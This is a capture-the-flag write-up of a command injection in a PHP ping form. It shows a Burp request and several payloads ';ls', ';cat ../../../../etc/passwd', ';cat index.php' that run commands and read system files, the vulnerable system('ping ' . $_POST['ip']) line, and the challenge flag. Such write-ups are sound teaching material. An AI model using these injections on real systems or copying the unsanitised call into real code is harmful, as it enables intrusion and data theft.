# Web Qualifiers: IP Destroyer
## Statement
> Be careful who you ping!

Author: **@Mocanu Gabriel**

## Analysis

We arrive in a website in which we can choose a parameter which should be pinged.

Which means, if the filters are not well implemented, we should be able to proceed a command injection.

I intercepted the ping request in Burp-Suite and reproduced it by changing the ip parameter as follows:
```
POST / HTTP/1.1
Host: 141.85.224.116:8084
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://141.85.224.116:8084
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://141.85.224.116:8084/
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

ip=;ls&destroy=Attack
```

And we get the ls result in the response
```html
<pre>a.txt
assets
images
index.php
index.php</pre>
```

The payload `;cat a.txt` shows us that a.txt corresponds to the logs of a 1.1.1.1 ping.

Still, `;cat ../../../../etc/passwd` works but we don't get any informations there.

We can still get the page source code with `;cat index.php` and we learn that if we set anything for the destroy parameter this part is launched.
```php
<?php if ($hasParam): ?>
    <p id="message">It actually just pings the target... Oops!</p>
    <pre><?php echo system('ping ' . $_POST['ip'] . ''); ?></pre>
<?php endif; ?>
```

We did not learn much more at this point and we still need to find the flag.

Finaly `ip=';cat a.txt;#&destroy=a``shows us that a.txt is empty.

We can even get the images using `;base64 images/bg01.jpg;`

We can go back to the only informations we have: cat .. etc/passwd.

We see that a line talks about a directory `/home/ctf`.

I went back to the ls research and indeed this location exists and there is a file named flag inside it! the a.txt file was a bait since the beginning.

## Exploitation

The payload `;cat ../../../home/ctf/flag` gives us the flag.

Flag: **SSS{hey_man_stop_pinging_around}**